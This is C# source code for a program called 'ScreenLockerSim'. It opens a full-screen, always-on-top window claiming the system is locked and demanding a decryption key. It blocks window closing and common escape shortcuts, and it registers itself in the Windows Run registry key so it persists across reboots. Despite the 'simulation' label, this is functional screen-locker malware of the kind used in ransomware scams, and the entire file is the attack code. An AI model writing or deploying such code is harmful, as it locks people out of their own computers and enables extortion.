using System;
using System.Drawing;
using System.Windows.Forms;
using Microsoft.Win32;  // Import to interact with the registry

namespace ScreenLockerSim
{
    public class Locker : Form
    {
        private TextBox keyBox;
        private Button unlockButton;
        private Label infoLabel;
        private string correctKey = "rhJ5DdH$$mvsfe%3ab2n3vD^&kzyh&wT8TezYPv$B$q85k5K3NG&t^amBnXGg&sy";

        public Locker()
        {
            this.FormBorderStyle = FormBorderStyle.None;
            this.WindowState = FormWindowState.Maximized;
            this.TopMost = true;
            this.BackColor = Color.Black;
            this.StartPosition = FormStartPosition.CenterScreen;

            infoLabel = new Label
            {
                Text = "Your system has been locked!\nEnter the decryption key to unlock.",
                ForeColor = Color.White,
                BackColor = Color.Black,
                Font = new Font("Consolas", 18),
                AutoSize = false,
                TextAlign = ContentAlignment.MiddleCenter,
                Dock = DockStyle.Top,
                Height = 200
            };
            this.Controls.Add(infoLabel);

            keyBox = new TextBox
            {
                Width = 600,
                Font = new Font("Consolas", 14),
                Top = this.Height / 2,
                Left = (this.Width - 600) / 2
            };
            this.Controls.Add(keyBox);

            unlockButton = new Button
            {
                Text = "Unlock",
                Width = 200,
                Height = 50,
                Font = new Font("Consolas", 14),
                Top = keyBox.Bottom + 20,
                Left = (this.Width - 200) / 2
            };
            unlockButton.Click += UnlockButton_Click;
            this.Controls.Add(unlockButton);

            this.KeyPress += LockUserInput;
            this.MouseClick += LockMouseInput;
            this.MouseMove += LockMouseInput;
            this.FormClosing += LockFormClosing;
            this.KeyDown += LockKeyPress;

            AddToStartup();
        }

        private void UnlockButton_Click(object sender, EventArgs e)
        {
            if (keyBox.Text == correctKey)
            {
                MessageBox.Show("Decryption successful. Your system is unlocked.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                Application.Exit();
            }
            else
            {
                MessageBox.Show("Incorrect key. Try again.", "Access Denied", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void LockUserInput(object sender, KeyPressEventArgs e)
        {
            if (sender != keyBox)
                e.Handled = true;
        }

        private void LockMouseInput(object sender, MouseEventArgs e)
        {
            e.Handled = true;
        }

        private void LockFormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void LockKeyPress(object sender, KeyEventArgs e)
        {
            if (e.Alt && e.KeyCode == Keys.F4)
            {
                e.Handled = true;
            }

            if (e.Alt && e.KeyCode == Keys.Tab)
            {
                e.Handled = true;
            }

            if (e.Control && e.KeyCode == Keys.Escape)
            {
                e.Handled = true;
            }
        }

        private void AddToStartup()
        {
            string exePath = Application.ExecutablePath;
            string key = @"Software\Microsoft\Windows\CurrentVersion\Run";
            string appName = "ScreenLockerSim";

            using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(key, true))
            {
                if (registryKey.GetValue(appName) == null)
                {
                    registryKey.SetValue(appName, exePath);
                }
            }
        }

        [STAThread]
        public static void Main()
        {
            Application.EnableVisualStyles();
            Application.Run(new Locker());
        }
    }
}
